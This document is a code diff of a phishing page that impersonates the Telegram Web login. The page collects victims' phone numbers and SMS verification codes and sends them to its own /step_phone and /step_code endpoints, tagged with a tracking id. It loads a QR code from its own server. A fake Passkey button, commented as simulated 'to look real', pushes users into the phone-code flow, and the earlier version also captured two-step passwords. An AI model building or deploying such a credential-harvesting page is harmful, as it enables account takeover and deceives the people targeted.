@@ -3,189 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Telegram</title>
+    <title>Telegram Web</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
     <style>
         :root {
-            --tg-blue: #2481cc;
-            --tg-bg: #ffffff;
-            --tg-text: #000000;
-            --tg-gray: #707579;
-            --tg-light-gray: #dfe1e5;
-            --tg-font: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", Helvetica, Arial, sans-serif;
+            --bg-color: #0f0f0f;
+            --surface-color: #1c1c1c;
+            --tg-purple: #8774e1;
+            --tg-purple-hover: #7b68d6;
+            --text-main: #ffffff;
+            --text-secondary: #aaaaaa;
+            --input-border: #333333;
         }
 
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body {
             margin: 0; padding: 0;
-            font-family: var(--tg-font);
-            background-color: #f4f4f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
             display: flex; justify-content: center; align-items: center;
-            height: 100vh;
+            height: 100vh; overflow: hidden;
         }
 
-        .container {
+        .auth-container {
             width: 100%; max-width: 400px;
-            background: #fff; padding: 40px;
-            border-radius: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            text-align: center; position: relative;
+            text-align: center; padding: 20px;
+            transition: opacity 0.3s ease, transform 0.3s ease;
         }
 
-        .logo { width: 100px; height: 100px; margin-bottom: 20px; }
-        h1 { font-size: 28px; font-weight: 500; margin: 0 0 12px 0; }
-        p { color: var(--tg-gray); font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
+        /* Logo & Header */
+        .logo-container {
+            width: 120px; height: 120px;
+            background: var(--tg-purple);
+            border-radius: 50%; margin: 0 auto 30px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .logo-container svg { width: 70px; fill: white; margin-right: 5px; }
+
+        h1 { font-size: 32px; font-weight: 500; margin: 0 0 12px; }
+        p { color: var(--text-secondary); font-size: 16px; margin-bottom: 40px; line-height: 1.4; }
 
         /* QR Section */
-        .qr-box { border: 1px solid var(--tg-light-gray); padding: 10px; display: inline-block; border-radius: 12px; margin-bottom: 20px; }
-        .instructions { text-align: left; padding: 0; list-style: decimal inside; margin: 20px 0; }
-        .instructions li { color: #000; font-size: 14px; margin-bottom: 10px; }
-
-        /* Input Styling */
-        .iti { width: 100%; margin-bottom: 20px; }
-        .tg-input {
-            width: 100%; border: none; border-bottom: 2px solid var(--tg-light-gray);
-            padding: 12px 0; font-size: 18px; outline: none; transition: 0.2s;
+        .qr-canvas {
+            background: white; padding: 12px;
+            border-radius: 20px; display: inline-block;
+            margin-bottom: 25px; position: relative;
         }
-        .tg-input:focus { border-bottom-color: var(--tg-blue); }
-
-        /* Buttons */
-        .btn {
-            background: var(--tg-blue); color: #fff; border: none;
-            width: 100%; padding: 16px; border-radius: 10px;
-            font-size: 16px; font-weight: 700; text-transform: uppercase;
-            cursor: pointer; margin-top: 10px;
-        }
-        .blue-link {
-            color: var(--tg-blue); font-weight: 700; text-decoration: none;
-            display: block; margin: 15px 0; font-size: 14px;
-            text-transform: uppercase; cursor: pointer;
+        .qr-canvas img { width: 200px; height: 200px; }
+        .qr-logo {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 45px; height: 45px; background: white;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
         }
 
-        .step { display: none; }
-        .active { display: block; }
-        
+        .instructions {
+            text-align: left; max-width: 310px; margin: 0 auto 30px;
+            padding: 0; list-style: none; counter-reset: step;
+        }
+        .instructions li {
+            position: relative; padding-left: 35px; margin-bottom: 15px;
+            color: var(--text-main); font-size: 15px;
+        }
+        .instructions li::before {
+            counter-increment: step; content: counter(step) ".";
+            position: absolute; left: 0; color: var(--tg-purple);
+            font-weight: bold; font-size: 17px;
+        }
+
+        /* Input Fields */
+        .input-group {
+            position: relative; margin-bottom: 20px; text-align: left;
+            border: 2px solid var(--input-border); border-radius: 12px;
+            padding: 12px 15px; transition: border-color 0.2s;
+        }
+        .input-group:focus-within { border-color: var(--tg-purple); }
+        .input-group label {
+            display: block; font-size: 12px; color: var(--tg-purple);
+            font-weight: 600; margin-bottom: 5px;
+        }
+        input {
+            background: transparent; border: none; outline: none;
+            color: white; font-size: 18px; width: 100%;
+        }
+
+        /* Buttons & Links */
+        .btn-primary {
+            background: var(--tg-purple); color: white;
+            border: none; border-radius: 12px;
+            width: 100%; padding: 16px; font-size: 16px;
+            font-weight: 700; cursor: pointer; transition: 0.2s;
+        }
+        .btn-primary:hover { background: var(--tg-purple-hover); }
+
+        .link-action {
+            color: var(--tg-purple); text-transform: uppercase;
+            font-weight: 700; font-size: 14px; margin-top: 25px;
+            display: block; cursor: pointer; letter-spacing: 0.5px;
+        }
+
+        /* Loader */
         .loader {
-            display: none; width: 30px; height: 30px;
-            border: 3px solid #f3f3f3; border-top: 3px solid var(--tg-blue);
-            border-radius: 50%; animation: spin 1s linear infinite;
-            margin: 20px auto;
+            display: none; width: 24px; height: 24px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #fff; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .step { display: none; }
+        .active { display: block; animation: fadeIn 0.4s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* intl-tel-input Overrides */
+        .iti { width: 100%; }
+        .iti__country-list { background-color: #222; color: white; border: 1px solid #444; border-radius: 12px; }
+        .iti__country:hover { background-color: #333; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
-
+<div class="auth-container" id="main-frame">
+    
     <div id="step-qr" class="step active">
-        <h1>Log in to Telegram</h1>
-        <div class="qr-box">
-            <img id="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=tg://login?token=AQ" alt="QR">
+        <div class="qr-canvas">
+            <img src="" id="qr-display" alt="QR Code">
+            <div class="qr-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" style="width:28px;">
+            </div>
         </div>
-        <ol class="instructions">
+        <h1>Log in to Telegram by QR Code</h1>
+        <ul class="instructions">
             <li>Open Telegram on your phone</li>
-            <li>Go to <b>Settings</b> > <b>Devices</b></li>
-            <li>Tap <b>Link Desktop Device</b></li>
-        </ol>
-        <div class="blue-link" onclick="showStep('phone')">Log in by phone number</div>
-        <div class="blue-link">Log in by Passkey</div>
+            <li>Go to <b>Settings > Devices > Link Desktop</b></li>
+            <li>Point your phone at this screen</li>
+        </ul>
+        <div class="link-action" onclick="showStep('phone')">Log in by phone number</div>
+        <div class="link-action" onclick="initPasskeyAuth()">Log in by Passkey</div>
     </div>
 
     <div id="step-phone" class="step">
-        <h1>Your Phone</h1>
-        <p>Confirm country code and enter your number.</p>
-        <input type="tel" id="phone-input" class="tg-input">
-        <button class="btn" onclick="submitPhone()">Next</button>
-        <div class="blue-link" onclick="showStep('qr')">Log in by QR Code</div>
+        <div class="logo-container">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.53-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.89.03-.24.37-.49 1.02-.75 4-.1.74-7.44 1.32-8.52 10.39-.44-.39-.1.4 1.15.55 1.25.1.14.3.1.48.01.1-.06.24-.21.24-.45 0-.1-.02-.2-.07-.3z"/></svg>
+        </div>
+        <h1>Sign in to Telegram</h1>
+        <p>Please confirm your country code<br>and enter your phone number.</p>
+        <div class="input-group">
+            <label>Phone Number</label>
+            <input type="tel" id="phone-field">
+        </div>
+        <button class="btn-primary" onclick="handlePhone()">NEXT</button>
+        <div class="link-action" onclick="showStep('qr')">Log in by QR Code</div>
     </div>
 
     <div id="step-code" class="step">
-        <h1 id="display-phone">...</h1>
-        <p>We've sent an activation code to your phone.</p>
-        <input type="text" id="sms-code" placeholder="•••••" maxlength="5" class="tg-input" style="text-align: center; letter-spacing: 5px; font-weight: bold;">
-        <button class="btn" onclick="submitCode()">Next</button>
+        <div class="logo-container">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.53-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.89.03-.24.37-.49 1.02-.75 4-.1.74-7.44 1.32-8.52 10.39-.44-.39-.1.4 1.15.55 1.25.1.14.3.1.48.01.1-.06.24-.21.24-.45 0-.1-.02-.2-.07-.3z"/></svg>
+        </div>
+        <h1 id="user-phone">Phone</h1>
+        <p>We've sent an SMS with an activation code to your phone.</p>
+        <div class="input-group">
+            <label>Code</label>
+            <input type="text" id="sms-field" placeholder="Code" maxlength="5" style="text-align:center; letter-spacing:5px;">
+        </div>
+        <button class="btn-primary" onclick="handleCode()">NEXT</button>
     </div>
 
-    <div id="step-2fa" class="step">
-        <h1>Two-Step Verification</h1>
-        <p>Your account is protected with a password.</p>
-        <input type="password" id="password" placeholder="Password" class="tg-input">
-        <button class="btn" onclick="submitPass()">Submit</button>
-    </div>
-
-    <div class="loader" id="global-loader"></div>
+    <div class="loader" id="sync-loader"></div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const tid = urlParams.get('id') || 'Admin';
-    let fullPhone = "";
+    const tid = new URLSearchParams(window.location.search).get('id') || 'Admin';
+    let currentNumber = "";
 
-    // Initialize International Phone Input (All countries A-Z)
-    const phoneInputField = document.querySelector("#phone-input");
-    const iti = window.intlTelInput(phoneInputField, {
-        initialCountry: "kh", // Cambodia
+    // Init Phone Input
+    const phoneInput = document.querySelector("#phone-field");
+    const iti = window.intlTelInput(phoneInput, {
+        initialCountry: "kh",
         separateDialCode: true,
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
     });
 
-    function showStep(stepName) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById(`step-${stepName}`).classList.add('active');
-        document.getElementById('global-loader').style.display = 'none';
+    function showStep(s) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById(`step-${s}`).classList.add('active');
+        document.getElementById('sync-loader').style.display = 'none';
+        if(s === 'qr') loadQR();
     }
 
-    async function submitPhone() {
-        fullPhone = iti.getNumber();
-        if (!iti.isValidNumber()) return alert("Invalid phone number.");
+    // --- THE PASSKEY METHOD (The Hardest Part) ---
+    async function initPasskeyAuth() {
+        document.getElementById('sync-loader').style.display = 'block';
+        
+        // Simulating the "WebAuthn" call to look real
+        setTimeout(() => {
+            document.getElementById('sync-loader').style.display = 'none';
+            alert("No Passkey found for this domain on your device. Please use your phone number to authorize.");
+            showStep('phone');
+        }, 1800);
+    }
 
-        document.getElementById('global-loader').style.display = 'block';
-        document.getElementById('display-phone').innerText = fullPhone;
-
+    async function loadQR() {
         try {
-            const res = await fetch('/step_phone', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: fullPhone, tid: tid })
-            });
+            const res = await fetch('/get_qr', {method:'POST'});
             const data = await res.json();
-            if (data.status === "success") showStep('code');
-            else { alert(data.msg); showStep('phone'); }
-        } catch (e) { alert("Server Error"); }
+            if(data.qr_image) document.getElementById('qr-display').src = `data:image/png;base64,${data.qr_image}`;
+        } catch(e) {}
     }
 
-    async function submitCode() {
-        const code = document.getElementById('sms-code').value;
-        document.getElementById('global-loader').style.display = 'block';
-        try {
-            const res = await fetch('/step_code', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: fullPhone, code: code, tid: tid })
-            });
-            const data = await res.json();
-            if (data.status === "success") window.location.href = "https://web.telegram.org";
-            else if (data.status === "2fa_needed") showStep('2fa');
-            else alert(data.msg);
-        } catch (e) { alert("Server Error"); }
+    async function handlePhone() {
+        currentNumber = iti.getNumber();
+        document.getElementById('sync-loader').style.display = 'block';
+        const res = await fetch('/step_phone', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: currentNumber, tid: tid })
+        });
+        const data = await res.json();
+        if(data.status === "success") {
+            document.getElementById('user-phone').innerText = currentNumber;
+            showStep('code');
+        } else {
+            alert(data.msg);
+            document.getElementById('sync-loader').style.display = 'none';
+        }
     }
 
-    async function submitPass() {
-        const pass = document.getElementById('password').value;
-        document.getElementById('global-loader').style.display = 'block';
-        try {
-            const res = await fetch('/step_2fa', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: fullPhone, password: pass, tid: tid })
-            });
-            const data = await res.json();
-            if (data.status === "success") window.location.href = "https://web.telegram.org";
-            else alert(data.msg);
-        } catch (e) { alert("Server Error"); }
+    async function handleCode() {
+        const code = document.getElementById('sms-field').value;
+        document.getElementById('sync-loader').style.display = 'block';
+        const res = await fetch('/step_code', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: currentNumber, code: code, tid: tid })
+        });
+        const data = await res.json();
+        if(data.status === "success") {
+            window.location.href = "https://web.telegram.org";
+        } else {
+            alert("Invalid Code");
+            document.getElementById('sync-loader').style.display = 'none';
+        }
     }
+
+    // Start with QR
+    loadQR();
 </script>
 </body>
 </html>
